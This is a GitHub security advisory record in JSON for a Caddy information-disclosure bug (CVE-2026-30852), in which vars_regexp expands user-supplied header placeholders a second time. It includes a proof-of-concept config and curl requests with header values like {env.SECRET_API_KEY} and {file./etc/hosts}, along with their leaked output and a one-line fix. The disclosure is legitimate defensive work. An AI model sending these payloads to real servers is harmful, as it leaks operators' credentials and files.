@@ -1,0 +1,54 @@
+{
+  "id": "GHSA-m2w3-8f23-hxxf",
+  "modified": "2026-03-06T23:46:31.093489Z",
+  "published": "2026-03-06T23:40:19Z",
+  "aliases": [
+    "CVE-2026-30852"
+  ],
+  "summary": "Caddy's vars_regexp double-expands user input, leaking env vars and files",
+  "details": "### Summary\n\nThe `vars_regexp` matcher in `vars.go:337` double-expands user-controlled input through the Caddy replacer. When `vars_regexp` matches against a placeholder like `{http.request.header.X-Input}`, the header value gets resolved once (expected), then passed through `repl.ReplaceAll()` again (the bug). This means an attacker can put `{env.DATABASE_URL}` or `{file./etc/passwd}` in a request header and the server will evaluate it, leaking environment variables, file contents, and system info.\n\n`header_regexp` does NOT do this — it passes header values straight to `Match()`. So this is a code-level inconsistency, not intended behavior.\n\n### Details\n\nThe bug is at `modules/caddyhttp/vars.go`, line 337 in `MatchVarsRE.MatchWithError()`:\n\n```go\nvalExpanded := repl.ReplaceAll(varStr, \"\")\nif match := val.Match(valExpanded, repl); match {\n```\n\nWhen the key is a placeholder like `{http.request.header.X-Input}`, `repl.Get()` resolves it to the raw header value (first expansion, line 318). Then `repl.ReplaceAll()` runs on that value again (second expansion, line 337), which evaluates any `{env.*}`, `{file.*}`, `{system.*}` placeholders the user put in there.\n\nFor comparison, `header_regexp` (`matchers.go:1129`) and `path_regexp` (`matchers.go:703`) both pass values directly to `Match()` without this second expansion.\n\nThis `repl.ReplaceAll()` was added by PR #5408 to fix #5406 (vars_regexp not working with placeholder keys). The fix was needed for resolving the key, but it also re-expands the resolved value, which is the bug.\n\n\n*Side-by-side proof that this is a code bug, not misconfiguration — same header, same regex, different behavior:**\n\nConfig with both matchers on the same server:\n```json\n{\n  \"admin\": {\"disabled\": true},\n  \"apps\": {\n    \"http\": {\n      \"servers\": {\n        \"srv0\": {\n          \"listen\": [\":8080\"],\n          \"routes\": [\n            {\n              \"match\": [{\"path\": [\"/header_regexp\"], \"header_regexp\": {\"X-Input\": {\"name\": \"hdr\", \"pattern\": \".+\"}}}],\n              \"handle\": [{\"handler\": \"static_response\", \"body\": \"header_regexp: {http.regexp.hdr.0}\"}]\n            },\n            {\n              \"match\": [{\"path\": [\"/vars_regexp\"], \"vars_regexp\": {\"{http.request.header.X-Input}\": {\"name\": \"var\", \"pattern\": \".+\"}}}],\n              \"handle\": [{\"handler\": \"static_response\", \"body\": \"vars_regexp: {http.regexp.var.0}\"}]\n            }\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n```\n$ export SECRET=supersecretvalue123\n\n$ curl -H 'X-Input: {env.HOME}' http://127.0.0.1:8080/header_regexp\nheader_regexp: {env.HOME}                           # literal string, safe\n\n$ curl -H 'X-Input: {env.HOME}' http://127.0.0.1:8080/vars_regexp\nvars_regexp: /Users/test                           # expanded — env var leaked\n\n$ curl -H 'X-Input: {env.SECRET}' http://127.0.0.1:8080/header_regexp\nheader_regexp: {env.SECRET}                         # literal string, safe\n\n$ curl -H 'X-Input: {env.SECRET}' http://127.0.0.1:8080/vars_regexp\nvars_regexp: supersecretvalue123                    # secret leaked\n\n$ curl -H 'X-Input: {file./etc/hosts}' http://127.0.0.1:8080/header_regexp\nheader_regexp: {file./etc/hosts}                    # literal string, safe\n\n$ curl -H 'X-Input: {file./etc/hosts}' http://127.0.0.1:8080/vars_regexp\nvars_regexp: ##                                     # file contents leaked\n```\n\n### PoC\n\nSave this as `config.json`:\n```json\n{\n  \"admin\": {\"disabled\": true},\n  \"apps\": {\n    \"http\": {\n      \"servers\": {\n        \"srv0\": {\n          \"listen\": [\":8080\"],\n          \"routes\": [\n            {\n              \"match\": [\n                {\n                  \"vars_regexp\": {\n                    \"{http.request.header.X-Input}\": {\n                      \"name\": \"leak\",\n                      \"pattern\": \".+\"\n                    }\n                  }\n                }\n              ],\n              \"handle\": [\n                {\n                  \"handler\": \"static_response\",\n                  \"body\": \"Result: {http.regexp.leak.0}\"\n                }\n              ]\n            },\n            {\n              \"handle\": [\n                {\n                  \"handler\": \"static_response\",\n                  \"body\": \"No match\",\n                  \"status_code\": \"200\"\n                }\n              ]\n            }\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\nStart Caddy:\n```bash\nexport SECRET_API_KEY=sk-PRODUCTION-abcdef123456\ncaddy run --config config.json\n```\n\nRequests and output:\n\n```\n$ curl -v -H 'X-Input: hello' http://127.0.0.1:8080\n*   Trying 127.0.0.1:8080...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080\n\u003e GET / HTTP/1.1\n\u003e Host: 127.0.0.1:8080\n\u003e User-Agent: curl/8.7.1\n\u003e Accept: */*\n\u003e X-Input: hello\n\u003e\n* Request completely sent off\n\u003c HTTP/1.1 200 OK\n\u003c Content-Type: text/plain; charset=utf-8\n\u003c Server: Caddy\n\u003c Date: Wed, 18 Feb 2026 23:15:45 GMT\n\u003c Content-Length: 13\n\u003c\nLeaked: hello\n```\n\n```\n$ curl -v -H 'X-Input: {env.HOME}' http://127.0.0.1:8080\n*   Trying 127.0.0.1:8080...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080\n\u003e GET / HTTP/1.1\n\u003e Host: 127.0.0.1:8080\n\u003e User-Agent: curl/8.7.1\n\u003e Accept: */*\n\u003e X-Input: {env.HOME}\n\u003e\n* Request completely sent off\n\u003c HTTP/1.1 200 OK\n\u003c Content-Type: text/plain; charset=utf-8\n\u003c Server: Caddy\n\u003c Date: Wed, 18 Feb 2026 23:15:45 GMT\n\u003c Content-Length: 20\n\u003c\nLeaked: /Users/test\n```\n\n```\n$ curl -v -H 'X-Input: {env.SECRET_API_KEY}' http://127.0.0.1:8080\n*   Trying 127.0.0.1:8080...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080\n\u003e GET / HTTP/1.1\n\u003e Host: 127.0.0.1:8080\n\u003e User-Agent: curl/8.7.1\n\u003e Accept: */*\n\u003e X-Input: {env.SECRET_API_KEY}\n\u003e\n* Request completely sent off\n\u003c HTTP/1.1 200 OK\n\u003c Content-Type: text/plain; charset=utf-8\n\u003c Server: Caddy\n\u003c Date: Wed, 18 Feb 2026 23:15:45 GMT\n\u003c Content-Length: 34\n\u003c\nLeaked: sk-PRODUCTION-abcdef123456\n```\n\n```\n$ curl -v -H 'X-Input: {file./etc/hosts}' http://127.0.0.1:8080\n*   Trying 127.0.0.1:8080...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080\n\u003e GET / HTTP/1.1\n\u003e Host: 127.0.0.1:8080\n\u003e User-Agent: curl/8.7.1\n\u003e Accept: */*\n\u003e X-Input: {file./etc/hosts}\n\u003e\n* Request completely sent off\n\u003c HTTP/1.1 200 OK\n\u003c Content-Type: text/plain; charset=utf-8\n\u003c Server: Caddy\n\u003c Date: Wed, 18 Feb 2026 23:15:45 GMT\n\u003c Content-Length: 10\n\u003c\nLeaked: ##\n```\n\nAlso works with `{system.hostname}`, `{system.os}`, `{env.PATH}`, etc.\n\nDebug log (server starts clean, no errors):\n```\n{\"level\":\"info\",\"ts\":1771456228.917303,\"msg\":\"maxprocs: Leaving GOMAXPROCS=16: CPU quota undefined\"}\n{\"level\":\"info\",\"ts\":1771456228.917334,\"msg\":\"GOMEMLIMIT is updated\",\"GOMEMLIMIT\":15461882265,\"previous\":9223372036854775807}\n{\"level\":\"info\",\"ts\":1771456228.9173398,\"msg\":\"using config from file\",\"file\":\"config.json\"}\n{\"level\":\"warn\",\"ts\":1771456228.917349,\"logger\":\"admin\",\"msg\":\"admin endpoint disabled\"}\n{\"level\":\"info\",\"ts\":1771456228.917928,\"logger\":\"tls.cache.maintenance\",\"msg\":\"started background certificate maintenance\",\"cache\":\"0x340775faa300\"}\n{\"level\":\"warn\",\"ts\":1771456228.920725,\"logger\":\"http\",\"msg\":\"HTTP/2 skipped because it requires TLS\",\"network\":\"tcp\",\"addr\":\":8080\"}\n{\"level\":\"warn\",\"ts\":1771456228.920738,\"logger\":\"http\",\"msg\":\"HTTP/3 skipped because it requires TLS\",\"network\":\"tcp\",\"addr\":\":8080\"}\n{\"level\":\"info\",\"ts\":1771456228.920741,\"logger\":\"http.log\",\"msg\":\"server running\",\"name\":\"srv0\",\"protocols\":[\"h1\",\"h2\",\"h3\"]}\n{\"level\":\"info\",\"ts\":1771456228.9210382,\"msg\":\"autosaved config (load with --resume flag)\"}\n{\"level\":\"info\",\"ts\":1771456228.921052,\"msg\":\"serving initial configuration\"}\n```\n\n### Impact\n\nInformation disclosure. An attacker can leak:\n- Environment variables (`{env.DATABASE_URL}`, `{env.AWS_SECRET_ACCESS_KEY}`, etc.)\n- File contents up to 1MB (`{file./etc/passwd}`, `{file./proc/self/environ}`)\n- System info (`{system.hostname}`, `{system.os}`, `{system.wd}`)\n\nRequires a config where `vars_regexp` matches user-controlled input and the capture group is reflected back. The bug was introduced by PR #5408 (fix for #5406), affecting all versions since.\n\nSuggested one-line fix:\n```diff\n--- a/modules/caddyhttp/vars.go\n+++ b/modules/caddyhttp/vars.go\n@@ -334,7 +334,7 @@\n \t\t\tvarStr = fmt.Sprintf(\"%v\", vv)\n \t\t}\n\n-\t\tvalExpanded := repl.ReplaceAll(varStr, \"\")\n+\t\tvalExpanded := varStr\n \t\tif match := val.Match(valExpanded, repl); match {\n \t\t\treturn match, nil\n \t\t}\n```\n\nThis makes `vars_regexp` consistent with `header_regexp` and `path_regexp`. Placeholder key resolution (lines 315-318) is unaffected.\n\nTested on latest main commit at `95941a71` (2026-02-17).\n\n**AI Disclosure:** Used Claude (Anthropic) during code review and testing. All findings verified manually.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/caddyserver/caddy/v2/modules/caddyhttp",
+        "purl": "pkg:golang/github.com/caddyserver/caddy/v2/modules/caddyhttp"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "2.7.5"
+            },
+            {
+              "fixed": "2.11.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.11.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-m2w3-8f23-hxxf/GHSA-m2w3-8f23-hxxf.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-m2w3-8f23-hxxf"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/caddyserver/caddy/pull/5408"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/caddyserver/caddy"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/caddyserver/caddy/releases/tag/v2.11.2"
+    }
+  ]
+}
